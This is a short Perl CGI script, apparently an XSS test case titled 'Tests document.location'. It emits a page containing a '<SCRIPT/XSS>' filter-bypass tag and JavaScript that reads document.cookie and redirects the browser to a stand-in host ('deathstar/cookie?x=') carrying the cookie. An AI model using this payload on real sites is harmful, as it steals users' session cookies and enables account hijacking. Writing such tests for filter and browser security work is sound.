#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests document.location";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
<SCRIPT/XSS>alert("juhu");</SCRIPT>

    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"

		var mycookie = $evil;

		var dut = "http://deathstar/cookie?x=" + mycookie;
		alert(encodeURI("test\tb"));
		document.location.href = dut;
				
    </script>
|;

require "xss_basic_footer.pl";
